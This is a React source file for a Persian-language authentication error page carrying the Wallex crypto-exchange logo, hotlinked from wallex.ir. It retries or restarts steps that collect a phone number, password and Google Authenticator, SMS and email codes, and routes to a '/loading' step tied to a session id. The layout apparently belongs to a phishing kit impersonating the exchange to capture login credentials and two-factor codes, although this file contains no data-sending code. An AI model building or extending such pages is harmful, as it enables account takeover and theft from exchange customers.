import { useLocation, useNavigate } from "react-router-dom";
import { AlertTriangle, ChevronLeft } from "lucide-react";
import { Button } from "@/components/ui/button";

const AuthError = () => {
  const location = useLocation();
  const navigate = useNavigate();

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");
  const errorType = location.state?.errorType || "general";
  const stepType = location.state?.stepType || "";

  const getErrorMessage = () => {
    switch (errorType) {
      case "phone":
        return "شماره همراه وارد شده اشتباه است.";
      case "verification":
        return "کد تایید وارد شده اشتباه است.";
      case "password":
        return "رمز عبور وارد شده اشتباه است.";
      case "google":
        return "کد Google Authenticator وارد شده اشتباه است.";
      case "sms":
        return "کد پیامک وارد شده اشتباه است.";
      case "email":
        return "کد ایمیل وارد شده اشتباه است.";
      default:
        return "اطلاعات وارد شده اشتباه است.";
    }
  };

  const getErrorTitle = () => {
    switch (errorType) {
      case "phone":
        return "شماره همراه اشتباه";
      case "verification":
        return "کد تایید اشتباه";
      case "password":
        return "رمز عبور اشتباه";
      case "google":
        return "کد Google Auth اشتباه";
      case "sms":
        return "کد پیامک اشتباه";
      case "email":
        return "کد ایمیل اشتباه";
      default:
        return "اطلاعات اشتباه";
    }
  };

  const handleRetry = () => {
    // Navigate back to the appropriate form based on error type
    switch (errorType) {
      case "phone":
        navigate("/", { replace: true });
        break;
      case "verification":
        navigate("/verify-phone", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
        break;
      case "password":
        navigate("/auth-password", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
        break;
      case "google":
        navigate("/auth-google", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
        break;
      case "sms":
        navigate("/auth-sms", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
        break;
      case "email":
        navigate("/auth-email", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
        break;
      default:
        navigate("/loading", {
          state: { phoneNumber, sessionId },
          replace: true,
        });
    }
  };

  const handleGoHome = () => {
    // Clear session and go to home
    sessionStorage.removeItem("sessionId");
    sessionStorage.removeItem("phoneNumber");
    navigate("/", { replace: true });
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          width: "100%",
          maxWidth: "480px",
        }}
        className="form-card"
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            padding: "20px",
            width: "100%",
          }}
        >
          {/* Header */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleGoHome}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
              <span style={{ fontWeight: "700", fontSize: "16px" }}>
                خطا در احراز هویت
              </span>
            </div>
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </div>

          {/* Separator */}
          <hr
            style={{
              borderColor: "rgba(0, 0, 0, 0.2)",
              borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
              marginLeft: "-20px",
              marginRight: "-20px",
              marginTop: "8px",
              marginBottom: "8px",
            }}
          />

          {/* Error Content */}
          <div style={{ marginTop: "16px", textAlign: "center" }}>
            {/* Error Icon */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: "80px",
                height: "80px",
                backgroundColor: "rgb(220, 38, 38)",
                borderRadius: "50%",
                margin: "0 auto 24px",
              }}
            >
              <AlertTriangle
                style={{
                  width: "40px",
                  height: "40px",
                  color: "rgb(255, 255, 255)",
                }}
              />
            </div>

            {/* Error Message */}
            <div style={{ marginBottom: "24px" }}>
              <h2
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  color: "rgb(220, 38, 38)",
                  margin: "0 0 12px 0",
                  textAlign: "center",
                }}
              >
                {getErrorTitle()}
              </h2>
              <p
                style={{
                  fontSize: "16px",
                  color: "rgba(0, 0, 0, 0.8)",
                  margin: "0 0 8px 0",
                  lineHeight: "1.5",
                  textAlign: "center",
                }}
              >
                {getErrorMessage()}
              </p>
              <p
                style={{
                  fontSize: "14px",
                  color: "rgba(0, 0, 0, 0.6)",
                  margin: "0",
                  lineHeight: "1.4",
                  textAlign: "center",
                }}
              >
                لطفا اطلاعات صحیح را وارد کنید و دوباره تلاش کنید.
              </p>
            </div>

            {/* User Info */}
            {phoneNumber && (
              <div
                style={{
                  padding: "16px",
                  backgroundColor: "rgba(220, 38, 38, 0.05)",
                  borderRadius: "8px",
                  marginBottom: "24px",
                  border: "1px solid rgba(220, 38, 38, 0.2)",
                }}
              >
                <p
                  style={{
                    fontSize: "14px",
                    color: "rgba(0, 0, 0, 0.8)",
                    margin: "0",
                    textAlign: "right",
                  }}
                >
                  کاربر:{" "}
                  <strong style={{ direction: "ltr" }}>{phoneNumber}</strong>
                </p>
                {sessionId && (
                  <p
                    style={{
                      fontSize: "12px",
                      color: "rgba(0, 0, 0, 0.6)",
                      margin: "4px 0 0 0",
                      textAlign: "right",
                    }}
                  >
                    شناسه جلسه: <code>{sessionId}</code>
                  </p>
                )}
              </div>
            )}

            {/* Action Buttons */}
            <div style={{ marginTop: "24px" }}>
              <hr
                style={{
                  borderColor: "rgba(0, 0, 0, 0.2)",
                  marginLeft: "-20px",
                  marginRight: "-20px",
                  marginBottom: "16px",
                }}
              />
              <div style={{ display: "flex", gap: "12px" }}>
                <Button
                  onClick={handleGoHome}
                  variant="outline"
                  className="w-full"
                  style={{
                    border: "1px solid rgba(0, 0, 0, 0.2)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                  }}
                >
                  شروع مجدد
                </Button>
                <Button
                  onClick={handleRetry}
                  className="w-full"
                  style={{
                    backgroundColor: "rgb(220, 38, 38)",
                    color: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    border: "none",
                    cursor: "pointer",
                  }}
                >
                  تلاش مجدد
                </Button>
              </div>
            </div>

            {/* Help Note */}
            <div
              style={{
                marginTop: "24px",
                padding: "16px",
                backgroundColor: "rgb(248, 249, 250)",
                borderRadius: "8px",
                border: "1px solid rgba(0, 0, 0, 0.1)",
              }}
            >
              <p
                style={{
                  fontSize: "12px",
                  color: "rgba(0, 0, 0, 0.6)",
                  margin: "0",
                  lineHeight: "1.4",
                  textAlign: "center",
                }}
              >
                ⚠️ اگر مشکل ادامه داشت، با پشتیبانی تماس بگیرید
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: center;
          }
        }
      `}</style>
    </div>
  );
};

export default AuthError;
